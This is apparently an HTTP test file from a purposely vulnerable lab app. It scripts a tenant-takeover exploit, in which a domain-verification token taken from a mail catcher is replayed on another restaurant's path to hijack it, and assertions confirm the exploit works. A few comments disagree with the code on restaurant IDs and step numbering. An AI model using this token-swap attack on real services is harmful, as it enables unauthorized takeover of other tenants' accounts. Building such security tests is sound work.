# @import ../_imports.http

# =============================================================================
# VULNERABILITY: R03 Token Swap Hijacks Restaurants (middleware confusion)
# =============================================================================
#
# ATTACK SCENARIO:
#   Plankton (Chum Bucket owner):
#   1. Attempts to update Krusty Krab restaurant data, by providing his own domain (chum-bucket.sea)
#   2. Receives verification email to admin@chum-bucket.sea
#   3. Uses the token to update Krusty Krab restaurant data by sending a PATCH request to /restaurants/2 (his own restaurant ID)
#   4. Authorization check passes but the data update affects Krusty Krab instead of his own restaurant
#
# IMPACT:
#   Full tenant takeover. Any restaurant owner can hijack any other restaurant
#   by using their own valid token on another restaurant's path.
#
# STATUS: VULNERABLE in v307 (exploit succeeds)
#         This is the final vulnerability in the r03 series.
# =============================================================================

# =============================================================================
# SETUP: Reset database and prepare attack
# =============================================================================

### Seed the database with fresh state
# @name setup
{{
  await platform.seed();
  await mailpit.clear();
}}

# Use a static domain that we control via mailpit
@attackerDomain = hijack-test.sea

# Set restaurant IDs for clarity
@krusty_krab_id = 1
@chum_bucket_id = 2

# =============================================================================
# EXPLOIT: Token swap to hijack another restaurant
# =============================================================================

### Step 1: Request domain verification for attacker's own domain
# @name request_token
# @forceRef setup
# @tag r03, restaurants, v307, vulnerable
PATCH /restaurants/{{krusty_krab_id}}
Authorization: {{auth.basic("plankton")}}
Content-Type: application/json

{
  "name": "Evil Corp",
  "domain": "{{attackerDomain}}"
}

?? js $(response).isOk() == true
?? js $(response).field("status") == verification_email_sent


### Step 3: EXPLOIT - Use attacker's token to hijack Krusty Krab!
# Path: /restaurants/1 (Krusty Krab)
# Token: for attackerDomain (Plankton's domain)
# Middleware sets g.verified_domain = attackerDomain
# Handler trusts the token and updates restaurant 1's owner!
# @name exploit_hijack
# @forceRef request_token
# @tag r03, restaurants, v307, vulnerable
PATCH /restaurants/{{chum_bucket_id}}
Authorization: {{auth.basic("plankton")}}
Content-Type: application/json

{
  "domain": "{{attackerDomain}}",
  "token": "{{await mailpit.lastEmail(`admin@${attackerDomain}`).userToken()}}"
}

# VULNERABLE: Exploit succeeds - restaurant hijacked
?? js $(response).isOk() == true
?? js $(response).field("id") == {{krusty_krab_id}}
?? js $(response).field("domain") == {{attackerDomain}}


### Step 4: Verify the hijack - Krusty Krab now belongs to attacker
# @name verify_hijack
# @forceRef exploit_hijack
# @tag r03, restaurants, v307, vulnerable
GET /restaurants/{{krusty_krab_id}}

?? js $(response).isOk() == true
?? js $(response).field("id") == {{krusty_krab_id}}
?? js $(response).field("domain") == {{attackerDomain}}
